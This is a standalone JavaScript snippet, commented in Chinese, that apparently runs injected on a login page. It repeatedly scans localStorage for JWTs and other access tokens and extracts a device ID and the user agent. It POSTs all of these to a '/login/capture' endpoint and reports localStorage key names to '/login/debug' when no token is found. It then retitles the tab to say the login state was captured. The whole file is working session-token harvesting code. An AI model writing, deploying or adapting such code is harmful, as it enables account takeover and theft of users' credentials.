(function(){
  var sent = null;

  // 递归挖 token：结构可能是 {value:"<jwt>"} / {value:{token:"..."}} / 直接字符串
  function dig(o, depth) {
    if (depth > 4 || o == null) return null;
    if (typeof o === 'string') return o.length >= 30 ? o : null;
    if (typeof o !== 'object') return null;
    var keys = ['token', 'value', 'accessToken', 'access_token', 'jwt'];
    for (var i = 0; i < keys.length; i++) {
      if (o[keys[i]] != null) {
        var r = dig(o[keys[i]], depth + 1);
        if (r) return r;
      }
    }
    if (Array.isArray(o)) {
      for (var j = 0; j < o.length; j++) { var r2 = dig(o[j], depth + 1); if (r2) return r2; }
      return null;
    }
    var vals = Object.keys(o);
    for (var k = 0; k < vals.length; k++) {
      var r3 = dig(o[vals[k]], depth + 1);
      if (r3) return r3;
    }
    return null;
  }

  function fromKey(key) {
    try {
      var raw = localStorage.getItem(key);
      if (!raw) return null;
      var parsed = null;
      try { parsed = JSON.parse(raw); } catch (e) { parsed = raw; }
      var tok = dig(parsed, 0);
      if (!tok) return null;
      // JWT 或长得足够像 token 的才收
      if (!/^eyJ[\w-]{10,}/.test(tok) && tok.length < 40) return null;
      return tok;
    } catch (e) { return null; }
  }

  function findToken() {
    var order = ['userToken', 'token', 'token_persist', 'token_restore'];
    for (var i = 0; i < order.length; i++) {
      var t = fromKey(order[i]);
      if (t) return { token: t, key: order[i] };
    }
    // 兜底：扫全部键，找 JWT
    for (var j = 0; j < localStorage.length; j++) {
      var k = localStorage.key(j);
      var t2 = fromKey(k);
      if (t2 && /^eyJ/.test(t2)) return { token: t2, key: k };
    }
    return null;
  }

  function deviceId() {
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        var v = localStorage.getItem(k) || '';
        var m = v.match(/[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}/i);
        if (m) return m[0];
      }
    } catch (e) {}
    return '';
  }

  function keysDump() {
    try {
      var out = [];
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        var v = localStorage.getItem(k) || '';
        out.push(k + '(' + v.length + ')');
      }
      return out.join(',');
    } catch (e) { return 'err'; }
  }

  var reported = false;
  setInterval(function(){
    var hit = findToken();
    if (!hit && !reported) {
      reported = true;
      fetch('/login/debug', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ stage:'no-token', keys: keysDump() }) }).catch(function(){});
      return;
    }
    if (!hit || hit.token === sent) return;
    sent = hit.token;
    fetch('/login/capture', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ token: hit.token, key: hit.key, deviceId: deviceId(), ua: navigator.userAgent })
    }).then(function(r){ return r.json() }).then(function(d){
      try { document.title = (d && d.ok) ? '✓ 已捕获登录态，可以关闭此页' : '捕获失败'; } catch(e){}
    }).catch(function(){});
  }, 1200);
})();
